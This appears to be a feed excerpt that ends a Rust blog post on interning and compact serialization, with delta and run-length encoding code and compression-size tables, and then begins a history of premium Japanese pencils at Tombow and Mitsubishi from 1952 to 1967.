<picture>
  <source srcset="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-sizes-356bc0a-4ea388f-dark.OS4k2hmGzzHu.svg" media="(prefers-color-scheme: dark)" width="800" height="600">
  <img src="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-sizes-356bc0a-4ea388f.Ek14Qs--wRbq.svg" width="800" height="600" loading="lazy" alt="Histogram of encoded sizes">
</picture>
</a>
</p>

<table id="table-sizes-356bc0a-4ea388f">
  <thead>
    <tr>
      <th>Format</th>
      <th>Serialization</th>
      <th>gzip -6</th>
      <th>brotli -6</th>
      <th>xz -6</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Postcard</td>
      <td>2966573 (-9%)</td>
      <td>746478 (-13%)</td>
      <td>624801 (-13%)</td>
      <td>499524 (-7%)</td>
    </tr>
    <tr>
      <td>Bincode</td>
      <td>5437330 (=)</td>
      <td>821573 (-8%)</td>
      <td>631655 (-10%)</td>
      <td>506956 (-4%)</td>
    </tr>
    <tr>
      <td>CBOR</td>
      <td>3688285 (-18%)</td>
      <td>814306 (-15%)</td>
      <td>634705 (-13%)</td>
      <td>493064 (-8%)</td>
    </tr>
    <tr>
      <td>JSON</td>
      <td>5317810 (-19%)</td>
      <td>841046 (-16%)</td>
      <td>708651 (-9%)</td>
      <td>504196 (-7%)</td>
    </tr>
    <tr>
      <td>JSON (pretty)</td>
      <td>15018136 (-17%)</td>
      <td>988869 (-15%)</td>
      <td>820774 (-8%)</td>
      <td>590380 (-7%)</td>
    </tr>
  </tbody>
</table>

<p>In practice, we can go one step further: not only were the deltas often small, but they were also often 1s, with long sequences of consecutive elements.
So I decided to add <a href="https://en.wikipedia.org/wiki/Run-length_encoding">run-length encoding</a> on top.
Note that because the IDs <a href="#sorting-sets-15">have been sorted</a>, the deltas are guaranteed to be non-negative, making a simple dual delta/RLE encoding possible: interpret a negative number <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span></span> as a run of <span><span><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>−</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">-n</annotation></semantics></math></span></span> consecutive elements, and a non-negative number as a delta from the previous element.</p>

<div><pre><code><span>original:</span><span> </span><span>[</span><span>0</span><span>,</span><span> </span><span>70</span><span>,</span><span> </span><span>72</span><span>,</span><span> </span><span>73</span><span>,</span><span> </span><span>74</span><span>,</span><span> </span><span>75</span><span>,</span><span> </span><span>77</span><span>,</span><span> </span><span>78</span><span>,</span><span> </span><span>79</span><span>,</span><span> </span><span>80</span><span>,</span><span> </span><span>81</span><span>]</span><span>
</span><span>optimized:</span><span> </span><span>[</span><span>0</span><span>,</span><span> </span><span>70</span><span>,</span><span> </span><span>2</span><span>,</span><span> </span><span>-3</span><span>,</span><span> </span><span>2</span><span>,</span><span> </span><span>-4</span><span>]</span><span>
</span></code></pre></div>

<div><pre><code><span>impl</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>Serialize</span> <span>for</span> <span>InternedSet</span><span>&lt;</span><span>T</span><span>&gt;</span> <span>{</span>
    <span>fn</span> <span>serialize</span><span>&lt;</span><span>S</span><span>&gt;</span><span>(</span><span>&amp;</span><span>self</span><span>,</span> <span>serializer</span><span>:</span> <span>S</span><span>)</span> <span>-&gt;</span> <span>Result</span><span>&lt;</span><span>S</span><span>::</span><span>Ok</span><span>,</span> <span>S</span><span>::</span><span>Error</span><span>&gt;</span>
    <span>where</span>
        <span>S</span><span>:</span> <span>Serializer</span><span>,</span>
    <span>{</span>
        <span>// Combined delta + RLE encoding.</span>
        <span>let</span> <span>mut</span> <span>rle_encoded</span> <span>=</span> <span>Vec</span><span>::</span><span>with_capacity</span><span>(</span><span>self</span><span>.set</span><span>.len</span><span>());</span>
        <span>let</span> <span>mut</span> <span>prev</span><span>:</span> <span>Option</span><span>&lt;</span><span>u32</span><span>&gt;</span> <span>=</span> <span>None</span><span>;</span>
        <span>let</span> <span>mut</span> <span>streak</span><span>:</span> <span>i32</span> <span>=</span> <span>0</span><span>;</span>

        <span>for</span> <span>x</span> <span>in</span> <span>&amp;</span><span>self</span><span>.set</span> <span>{</span>
            <span>let</span> <span>id</span> <span>=</span> <span>x</span><span>.id</span><span>();</span>
            <span>let</span> <span>diff</span> <span>=</span> <span>id</span> <span>-</span> <span>prev</span><span>.unwrap_or</span><span>(</span><span>0</span><span>);</span>
            <span>if</span> <span>prev</span><span>.is_some</span><span>()</span> <span>&amp;&amp;</span> <span>diff</span> <span>==</span> <span>1</span> <span>{</span>
                <span>streak</span> <span>+=</span> <span>1</span><span>;</span>
            <span>}</span> <span>else</span> <span>{</span>
                <span>if</span> <span>streak</span> <span>!=</span> <span>0</span> <span>{</span>
                    <span>rle_encoded</span><span>.push</span><span>(</span><span>-</span><span>streak</span><span>);</span>
                    <span>streak</span> <span>=</span> <span>0</span><span>;</span>
                <span>}</span>
                <span>rle_encoded</span><span>.push</span><span>(</span><span>diff</span> <span>as</span> <span>i32</span><span>);</span>
            <span>}</span>
            <span>prev</span> <span>=</span> <span>Some</span><span>(</span><span>id</span><span>);</span>
        <span>}</span>
        <span>if</span> <span>streak</span> <span>!=</span> <span>0</span> <span>{</span>
            <span>rle_encoded</span><span>.push</span><span>(</span><span>-</span><span>streak</span><span>);</span>
        <span>}</span>

        <span>serializer</span><span>.collect_seq</span><span>(</span><span>rle_encoded</span><span>)</span>
    <span>}</span>
<span>}</span>
</code></pre></div>

<p>This last optimization gave mixed results: while the encoded size decreased by 4% to 11%, the compressed size remained similar – within ±2% (commit <a href="https://github.com/gendx/rust-interning/commit/d09835640cce8f0ee6f9d849cc8f60c7d07bd01e">d098356</a>).</p>

<p>
<a href="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-sizes-4ea388f-d098356.uHWcoLxoRSjR.svg">
<picture>
  <source srcset="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-sizes-4ea388f-d098356-dark.3rag3jB5bSJc.svg" media="(prefers-color-scheme: dark)" width="800" height="600">
  <img src="https://gendignoux.com/blog/images/rust-interning-2000x/histogram-sizes-4ea388f-d098356.uHWcoLxoRSjR.svg" width="800" height="600" loading="lazy" alt="Histogram of encoded sizes">
</picture>
</a>
</p>

<table id="table-sizes-4ea388f-d098356">
  <thead>
    <tr>
      <th>Format</th>
      <th>Serialization</th>
      <th>gzip -6</th>
      <th>brotli -6</th>
      <th>xz -6</th>
    </tr>
  </thead>
  <tbody>
    <tr>
      <td>Postcard</td>
      <td>2832574 (-5%)</td>
      <td>751517 (+1%)</td>
      <td>632425 (+1%)</td>
      <td>504388 (+1%)</td>
    </tr>
    <tr>
      <td>Bincode</td>
      <td>4855254 (-11%)</td>
      <td>825177 (+0%)</td>
      <td>643860 (+2%)</td>
      <td>516736 (+2%)</td>
    </tr>
    <tr>
      <td>CBOR</td>
      <td>3539237 (-4%)</td>
      <td>813895 (-0%)</td>
      <td>637836 (+0%)</td>
      <td>495860 (+1%)</td>
    </tr>
    <tr>
      <td>JSON</td>
      <td>5103171 (-4%)</td>
      <td>846290 (+1%)</td>
      <td>714886 (+1%)</td>
      <td>510584 (+1%)</td>
    </tr>
    <tr>
      <td>JSON (pretty)</td>
      <td>13361128 (-11%)</td>
      <td>983777 (-1%)</td>
      <td>823720 (+0%)</td>
      <td>587044 (-1%)</td>
    </tr>
  </tbody>
</table>

<h2 id="final-result-a-lightweight-append-only-database"><span><a href="#final-result-a-lightweight-append-only-database"></a></span>Final result: a lightweight append-only database</h2>

<p>To reproduce these results, you’ll find my code <a href="https://github.com/gendx/rust-interning">on GitHub</a>.
I’ve used the RATP Status data at <a href="https://github.com/wincelau/ratpstatus/tree/ef028cce567b6ce9183a185e699206e0f483b99d">commit <code>ef028cc</code></a> (files in the <a href="https://github.com/wincelau/ratpstatus/tree/ef028cce567b6ce9183a185e699206e0f483b99d/datas/json"><code>datas/json/</code> folder</a>).</p>

<div><pre><code>git init
git remote add origin https://github.com/wincelau/ratpstatus
git fetch <span>--depth</span> 1 origin ef028cce567b6ce9183a185e699206e0f483b99d
git checkout FETCH_HEAD
</code></pre></div>

<p>Conceptually, interning is a simple technique, yet we’ve seen that it can lead to many choices and optimizations.
It’s commonly applied to strings, but in practice what really made a difference was broadly interning all sorts of data structures!</p>

<p>At the end of this article, we have implicitly built one of the simplest relational database designs (without all the querying/SQL part).
It comes a few limitations, which are fine for a time series:</p>
<ul>
  <li><strong>append-only</strong>: we can’t modify nor delete existing objects,</li>
  <li><strong>in-memory</strong>: the serialized form doesn’t support random access of a value at an arbitrary index, so we need to deserialize the whole database in memory,</li>
  <li><strong>single-writer</strong>: to increment the index when interning a new object without synchronization.</li>
</ul>

<p>Something that should be fairly simple to add is supporting incremental updates: given that the interning tables are append-only with incremental indices, you could easily take a snapshot of the database and later create a diff containing only the new objects added since the snapshot.
Multiple reader nodes could then be implemented on top of that, which would give us a replicated database: the writer would broadcast incremental updates to the readers from time to time.</p>

<p>Now, practically, should you use one of the <a href="https://lib.rs/keywords/interning">countless existing interning crates</a>, or <a href="https://lucumr.pocoo.org/2025/1/24/build-it-yourself/">write it yourself</a>?
The answer is that it depends on what you’re doing!</p>

<p>Do you care about a very optimized in-memory layout for strings?
The naive <code>Rc&lt;String&gt;</code> representation I’ve shown may not be ideal.
Are you fine with a single global interner or do you want to manipulate local interner arenas like I’ve shown in this post?
Do you need to serialize your data, and if so should the serialization be compact?</p>

<p>You might even have come up with the interning pattern yourself without knowing it had a name nor that plenty of libraries implement it: that’s perfectly fine too!
Hopefully this post can help you evaluate the existing libraries and make an informed decision to reinvent the wheel or not.</p>

<hr>



        
        <hr>
        <h2>Comments</h2>
        <p>
            To react to this blog post please check
            the <a href="https://infosec.exchange/@gendx/114099583779462472"> Mastodon thread</a>, the <a href="https://lobste.rs/s/mlseaq/power_interning_making_time_series">Lobste.rs thread</a> and the <a href="https://www.reddit.com/r/rust/comments/1j2nfwt/the_power_of_interning_making_a_time_series/"> Reddit thread</a>.
        </p>
        
        <hr>
        <p>
            <a href="https://gendignoux.com/blog/feed.xml" target="_blank"> RSS</a> |
            <a href="https://infosec.exchange/@gendx" target="_blank"> Mastodon</a> |
            <a href="https://github.com/gendx" target="_blank"> GitHub</a>
        </p>
        <hr>
        <h2>You may also like</h2>
        
    </section>
</article></div>]]></description>
        </item>
        <item>
            <title><![CDATA[The Golden Age of Japanese Pencils, 1952-1967 (125 pts)]]></title>
            <link>https://notes.stlartsupply.com/the-golden-age-of-japanese-pencils-1952-1967/</link>
            <guid>43243716</guid>
            <pubDate>Mon, 03 Mar 2025 16:51:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://notes.stlartsupply.com/the-golden-age-of-japanese-pencils-1952-1967/">https://notes.stlartsupply.com/the-golden-age-of-japanese-pencils-1952-1967/</a>, See on <a href="https://news.ycombinator.com/item?id=43243716">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
    <main>
            <article>
    

    <div>
        <p>It was the summer of 1952, and the executives of Tombow Pencil were about to revolutionize the Japanese pencil industry—or, possibly, fall flat on their faces. Hachiro Ogawa, the son of founder Harunosuke Ogawa, was Tombow's managing director, and he had just finished a years-long project, at enormous cost, to make the best pencil Japan had ever seen. </p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/tombow-supreme-quality-4h-vintage-pencil-2.jpg" alt="" loading="lazy" width="2000" height="1335" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/tombow-supreme-quality-4h-vintage-pencil-2.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/tombow-supreme-quality-4h-vintage-pencil-2.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/tombow-supreme-quality-4h-vintage-pencil-2.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/tombow-supreme-quality-4h-vintage-pencil-2.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>An early Tombow HOMO drawing pencil with transparent lacquer. Note the "H.O.P. Product" branding—in the early 1950s, Tombow still printed this abbreviation for "Harunosuke Ogawa Pencil" on each product. The Tombow name and dragonfly logo are foil-stamped on the opposite side. (</span><i><em>St. Louis Art Supply archives)</em></i></figcaption></figure><p>It was called "HOMO," because in comparison with other Japanese pencils of its day, Tombow's new model had a much more homogenous core. Pencil cores are a mixture of graphite and clay (thanks to Nicolas-Jacques Conté's invention of the modern pencil in the late eighteenth century), and the components in early cores were not always evenly mixed. This was particularly true in Japan, where pencils had only been made since the turn of the century and advanced industrial equipment was just starting to become available.</p><p>Hachiro's team at Tombow was determined to do whatever it took to produce more consistent cores. They struck up a working relationship with scientists at the University of Tokyo, a visionary move that yielded crucial technical research in 1948. Then, to implement the research findings, Tombow had to import more advanced industrial mills from the United States.</p><p>It was a gamble, but it worked, and suddenly Tombow could make much finer particles of graphite and clay than any other Japanese manufacturer. HOMO cores were stronger, smoother, and more consistent than anything else on the domestic market. They came in 17 grades, from 9H to 9B, a wide and finely graduated range that hadn't been possible with Tombow's old process.</p><p>They were also incredibly beautiful. Another import that had become available in the wake of World War II was incense cedar, the material of choice for high-quality pencils. Most of the pencil industry's incense cedar comes from California, and Tombow quickly restarted its imports of the aromatic red wood. HOMO's design takes full advantage of the material upgrade, with a subtle transparent lacquer that highlights the cedar's color and grain.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/tokyo-kaikan-in-1940.jpg" alt="" loading="lazy" width="2000" height="1333" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/tokyo-kaikan-in-1940.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/tokyo-kaikan-in-1940.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/tokyo-kaikan-in-1940.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/tokyo-kaikan-in-1940.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>Tokyo Kaikan meeting hall in 1940.</span></figcaption></figure><p>For Hachiro Ogawa and his father Harunosuke, the completion of the HOMO project was the culmination of a dream, and it was undoubtedly a pioneering moment in Japanese industry. But as the company prepared to introduce HOMO at the grand Tokyo Kaikan meeting hall, the skeptics must have been hard to ignore. In the early 1950s, a Japanese pencil cost five or ten yen (about 25-50 cents in 2022 dollars.) Tombow's technical leap forward had produced a model far superior to those inexpensive pencils, but they would also be pioneers in price. HOMO would cost 30 yen (about $1.50 today) for a single pencil, with boxes of twelve priced at 360 yen (about $19 today.)</p><p>Japanese consumers weren't used to spending that kind of money on a pencil. But if Hachiro, Harunosuke, and their colleagues were nervous, their fears were surely resolved at the first-ever Tombow New Product Presentation. Tokyo Kaikan was the esteemed meeting place of foreign dignitaries, corporate titans, even heads of state—and now it was absolutely bustling with stationery wholesalers, curious people from other companies, and the press. Tombow took orders for 720,000 HOMO pencils on launch day alone.</p><p>Tombow's surprising success with Japan's first premium pencil, along with the ambition and competitive spirit of midcentury manufacturers, led to the most intense period of development the global pencil industry has ever seen. </p><p>We call it the Golden Age of Japanese Pencils.</p><p>The Golden Age began and ended with two Tombow launches: Hachiro's pioneering HOMO launch in 1952 and the <a href="https://shop.stlartsupply.com/products/mono-100-pencil-hb-set-of-12?ref=notes.stlartsupply.com">MONO 100</a> launch in 1967, fifteen years later. During this period, Tombow and its crosstown rival Mitsubishi Pencil created many of the greatest pencils of all time, including the two best-regarded models offered today.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/mitsubishi-9852-beauty-4.jpg" alt="" loading="lazy" width="2000" height="1335" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/mitsubishi-9852-beauty-4.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/mitsubishi-9852-beauty-4.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/mitsubishi-9852-beauty-4.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/mitsubishi-9852-beauty-4.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>A contemporary box of </span><a href="https://shop.stlartsupply.com/products/mitsubishi-9852-hb-pencils-box-of-12?ref=notes.stlartsupply.com"><span>Mitsubishi 9852 "Master Writing"</span></a><span> pencils from our shop's inventory. Neither the box nor the pencil has substantially changed since its 1955 release.</span></figcaption></figure><h3 id="prologue-the-great-tokyo-pencil-rivalry">Prologue: The Great Tokyo Pencil Rivalry</h3><p>Although HOMO was the first Japanese pencil with a modern core, Tombow wasn't the first pencil manufacturer in Japan. That was Jinroku Masaki's pencil factory, which delivered three grades of writing pencils to the Japanese Ministry of Communication in 1901. Masaki had been introduced to the pencil at the Paris Expo of 1878, and he was one of a few Japanese industrialists to learn about the new technology in depth.</p><p>Masaki established a small pencil manufacturing firm in 1887, and just four years later, he had improved his products enough to land a government contract. To commemmorate the three grades of his "ministry pencil," Masaki had the idea to register a three-diamond trademark, along with the "Mitsubishi" name, which means 'three diamonds.' (It may surprise you to learn that this was ten years before the much better-known Mitsubishi Group of heavy industry companies registered its name and identical mark. Mitsubishi Pencil has no connection to the numerous other Mitsubishi companies in Japan; it is and has always been a manufacturer of writing and drawing supplies.)</p><p>Tombow's predecessor, Harunosuke Ogawa Pencil, was a small Tokyo retailer established in 1913. The 28-year-old Ogawa and his wife Towa were energetic and resourceful, and they built their business in tandem with their growing family. They soon decided to try their hand at manufacturing, and the first H.O.P. brand pencil, the Mason, was released a year later.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/various-hop-tombow-pencils.jpg" alt="" loading="lazy" width="1500" height="998" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/various-hop-tombow-pencils.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/various-hop-tombow-pencils.jpg 1000w, https://notes.stlartsupply.com/content/images/2022/03/various-hop-tombow-pencils.jpg 1500w" sizes="(min-width: 720px) 720px"><figcaption><span>Early Harunosuke Ogawa Pencils (c. 1900-1920). Image from </span><a href="https://www.tomboweurope.com/unternehmen/ueber-uns?ref=notes.stlartsupply.com"><span>Tombow Europe</span></a><span>.</span></figcaption></figure><p>The two companies grew and innovated in parallel. As the <em>100 Year History of Tombow Pencil</em> puts it, Mitsubishi and Tombow were "good rivals," who pushed one another to new heights, collaborated in joint ventures overseas, and worked together to develop new industry standards. (As we'll see, they also copied each other shamelessly.)</p><p>In the early years, Tombow led the way in structuring the pencil market, creating new brands and grades intended for different types of users. Before World War II, Tombow introduced several forward-looking models. H.O.P. Drawing Pencils (1928) came in 14 grades and were Japan's very first complete line of artist pencils. And Tombow's groundbreaking Model 8800 (1936), with a formula devised to rival the leads made by German manufacturer Stabilo, influenced other Japanese pencils for decades after its introduction.</p><p>Tombow's technical advantage was the product of its early investment in a modern, centralized factory, where all the trades involved in pencil manufacturing would coexist under one roof. The new Toshima Factory opened in 1927, during one of the worst economic crashes in Japanese history. Nevertheless, the new facility allowed Tombow to outpace Mitsubishi and the other, smaller competitors in product development for almost a quarter century.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/9800-beauty.jpg" alt="" loading="lazy" width="2000" height="1333" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/9800-beauty.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/9800-beauty.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/9800-beauty.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/9800-beauty.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>A contemporary box of </span><a href="https://shop.stlartsupply.com/products/mitsubishi-9800-writing-pencils-one-dozen?ref=notes.stlartsupply.com"><span>Mitsubishi 9800</span></a><span> pencils, still sold today in grades HB, B, and 2B.</span></figcaption></figure><p>It was only after Mitsubishi opened its Koyasu Factory (still operational today, but now called Yokohama Office) in 1940 that the older company began to catch up to its rival. After the war, Mitsubishi and Tombow set to work releasing a series of nearly identical everyday pencils: the green-and-gold <a href="https://shop.stlartsupply.com/products/mitsubishi-9800-writing-pencils-one-dozen?variant=12181850226771&amp;ref=notes.stlartsupply.com">Mitsubishi 9800</a> with "matured micro graphite lead" in 1946, the green-and-gold <a href="https://shop.stlartsupply.com/products/tombow-8900-pencil-hb-set-of-12?ref=notes.stlartsupply.com">Tombow 8900</a> with "micro crystallite" lead in 1948, and the (yes) green-and-gold Mitsubishi 9000, "Made By Elaborate Process." All three of these pencils, made on the cusp of the Golden Age, are still manufactured and sold today.</p><p>Green and gold, by the way, is the color scheme of Castell 9000 pencils, which were among the best in the world at the time. The Japanese companies had honed their process, but they hadn't developed the confidence and brand identity to step out of the shadow of European manufacturers. Fueled by their early success and a quickly changing world, the rivals were about to change that.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/vintage-mitsubishi-3800-and-mono-construction-1.jpg" alt="" loading="lazy" width="2000" height="1335" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/vintage-mitsubishi-3800-and-mono-construction-1.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/vintage-mitsubishi-3800-and-mono-construction-1.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/vintage-mitsubishi-3800-and-mono-construction-1.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/vintage-mitsubishi-3800-and-mono-construction-1.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>Vintage Mitsubishi 3800 and Tombow MONO Construction pencils. Both models are now discontinued. (</span><i><em>St. Louis Art Supply archives)</em></i></figcaption></figure><h3 id="the-industry-gets-really-really-organized">The Industry Gets Really, Really Organized</h3><p>As they improved their products and competed in the global market, Japanese manufacturers were keen to build a reputation for quality and reliability. To that end, the government worked with a wide variety of industries to enforce quality standards for different types of products. The system, which persists to this day (but no longer includes pencils), is called the Japanese Industrial Standards, or JIS.</p><p>The JIS Daily Goods Subcommittee researched, deliberated, and consulted with experts to develop the pencil standards, which were officially adopted in 1951. Just two years later, an astonishing 90% of pencils made in Japan had met the standards and completed certification. These pencils displayed the JIS mark 〄, which appeared on quality Japanese pencils until the industry was eventually deregulated in 1998.</p><p>It may sound excessive to create a national standard for pencils, but these everyday products were very important to Japan's economic strategy. In the highly regulated postwar days, the government prioritized light industry, which produces consumer goods like pencils. That policy decision gave the pencil companies a head start in securing resources and capital. Even more importantly, as the decade went on, Japanese consumers simply had more money to spend. From 1950 to 1960, average wages in Japan rose by 250%.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/more-vintage-pencils-mar-2022-6.jpg" alt="" loading="lazy" width="2000" height="1335" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/more-vintage-pencils-mar-2022-6.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/more-vintage-pencils-mar-2022-6.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/more-vintage-pencils-mar-2022-6.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/more-vintage-pencils-mar-2022-6.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>The JIS mark, displayed on a vintage Mitsubishi pencil. </span><i><em>(St. Louis Art Supply archives)</em></i></figcaption></figure><p>Perhaps it isn't surprising, in retrospect, that Tombow's ultra-high-end HOMO pencil was an immediate success. And the rest of the industry wasn't far behind, because the science behind Tombow's new production process wasn't proprietary. As the product of a public-private collaboration with the University of Tokyo, the 1948 core research was available for anyone to read—and everyone did.</p><p>So, when HOMO created the premium pencil segment in Japan, the 109 other pencil manufacturers weren't caught flat-footed. As the Golden Age began, they raced to develop even more consistent cores, with finer-ground particles and thicker lacquer than the competition. Inspired by the case included with HOMO, Golden Age pencils often featured thick plastic storage cases, with transparent windows to display the increasingly refined and complex writing tools inside.</p><p>They proudly stamped their pencils in gold and silver foil, engraving them with English superlatives like "Supreme Quality" and "Master Writing." They made limited editions wrapped with illustrations and painted in special colors. And if one manufacturer advertised 100 million particles, another wouldn't be far behind with a 200-million-particle pencil.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/more-vintage-pencils-mar-2022-4.jpg" alt="" loading="lazy" width="2000" height="1335" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/more-vintage-pencils-mar-2022-4.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/more-vintage-pencils-mar-2022-4.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/more-vintage-pencils-mar-2022-4.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/more-vintage-pencils-mar-2022-4.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>A vintage Mitsubishi Copyrite 2000 pencil. </span><i><em>(St. Louis Art Supply archives)</em></i></figcaption></figure><h3 id="mitsubishi-goes-back-to-the-drawing-board">Mitsubishi Goes Back to the Drawing Board</h3><p>Yoji Suhara, director of engineering at Mitsubishi (and next in line for the chairmanship), wanted to know what the West thought of his company's pencils, so in 1953, he went on a fact-finding mission to Europe and the United States. He brought boxes of Mitsubishi 9000 pencils, their highest-quality model at the time, and asked local users what they thought about Japanese pencils.</p><p>Suhara was crestfallen to learn that his products had a poor reputation in their most important export markets. Consumers couldn't tell the difference between Mitsubishi's relatively advanced pencils and those from other Japanese producers who had emphasized production speed over quality control. The fact that the whole industry used similar color schemes and four-digit model numbers was confusing, particularly since they were, in many cases, exactly the same color schemes and model numbers as European manufacturers' well-known brands.</p><p>Suhara returned to Tokyo with a bitter taste in his mouth and a mission: to make a high-end pencil not just to top Tombow, but to show the world that Germany no longer had a monopoly on quality pencils.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/more-vintage-pencils-mar-2022-3.jpg" alt="" loading="lazy" width="2000" height="1335" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/more-vintage-pencils-mar-2022-3.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/more-vintage-pencils-mar-2022-3.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/more-vintage-pencils-mar-2022-3.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/more-vintage-pencils-mar-2022-3.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>A pair of vintage Mitsubishi 7679 pencils in soft green and pink. </span><i><em>(St. Louis Art Supply archives)</em></i></figcaption></figure><p>Back in Japan, Mitsubishi's engineers were already poring over the University of Tokyo pencil core research. Dramatic changes to the mixing, molding, and firing processes were all on the agenda, along with upgraded raw materials. Suhara and his colleagues tested 17 types of clay, finally settling on a variety sourced in Germany. To make the raw clay particles finer, Mitsubishi invented a new method of removing impurities; in recognition of this achievement, they earned a 30 million yen ($1.5 million today) subsidy from the Japanese Ministry of International Trade and Industry.</p><p>In addition to these technical improvements, Suhara wanted to make sure no one would confuse the new pencil with any other product in the world. It had to have a contemporary, well-considered, and unquestionably original design. In perhaps the best strategic decision in Mitsubishi's long history, the company hired Yoshio Akioka, who had recently designed the iconic Asakaze "Blue Train." </p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/EF66_55_asakaze_No.1.jpg" alt="" loading="lazy" width="945" height="684" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/EF66_55_asakaze_No.1.jpg 600w, https://notes.stlartsupply.com/content/images/2022/03/EF66_55_asakaze_No.1.jpg 945w" sizes="(min-width: 720px) 720px"><figcaption><span>The Asakaze "Blue Train" in 1988. Its designer, Yoshio Akioka, also led the Uni pencil development effort. Photo credit: </span><a href="https://commons.wikimedia.org/wiki/File:EF66_55_asakaze_No.1.jpg?ref=notes.stlartsupply.com"><span>spaceaero2</span></a><span>, </span><a href="https://creativecommons.org/licenses/by/3.0?ref=notes.stlartsupply.com"><span>CC BY 3.0</span></a><span>, via Wikimedia Commons</span></figcaption></figure><p>In an unconventional move, Mitsubishi gave Akioka extensive creative control over the project from the beginning; the esteemed industrial designer even suggested the price—50 yen ($2.50 today), the same price the European manufacturers were charging at the time.</p><p>One of Akioka's most important contributions was the color, an iconic maroon that's now synonymous with Mitsubishi pencils. The world's best brands all had a signature color, like Faber-Castell's deep green and Staedtler's bright blue. For Mitsubishi, Akioka chose a shade that felt distinctively Japanese, halfway between the traditional colors <em>enji</em> (wine red) and <em>ebicha</em> (maroon).</p><p>To make sure the color would be unique to Mitsubishi, Akioka ordered 160 pencils from manufacturers all over the world. No one had painted a pencil quite this shade of red before.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/ebicha-enji-uni.jpg" alt="" loading="lazy" width="2000" height="1333" srcset="https://notes.stlartsupply.com/content/images/size/w600/2022/03/ebicha-enji-uni.jpg 600w, https://notes.stlartsupply.com/content/images/size/w1000/2022/03/ebicha-enji-uni.jpg 1000w, https://notes.stlartsupply.com/content/images/size/w1600/2022/03/ebicha-enji-uni.jpg 1600w, https://notes.stlartsupply.com/content/images/2022/03/ebicha-enji-uni.jpg 2000w" sizes="(min-width: 720px) 720px"><figcaption><span>Uni's signature color is distinctively Japanese, but it's not exactly one of Japan's traditional colors.</span></figcaption></figure><p>Akioka named the new pencil, too—"Uni," short for the English word 'unique,' but also French for 'smooth.' Imagining the architects of the future drafting homes with Uni pencils, Akioka designed the timeless, rounded "uni" logotype, with wide, sturdy typography. As he put it, he wanted the Uni brand to be "a house that warmly wraps people up," instantly familiar and comfortable.</p><p>Today, most of Mitsubishi's global customers identify the company with Akioka's Uni brand, which Mitsubishi quickly began to use on a variety of other office supplies and stationery. In the United States, everyone knows Uni-ball pens, but not many people know that they're made by a 135-year-old company called Mitsubishi. That's a testament to the success of Akioka's work in the mid-fifties.</p><figure><img src="https://notes.stlartsupply.com/content/images/2022/03/kh20-sharpener-beauty.jpg" alt="" loading="lazy" width="2000" height="1335" 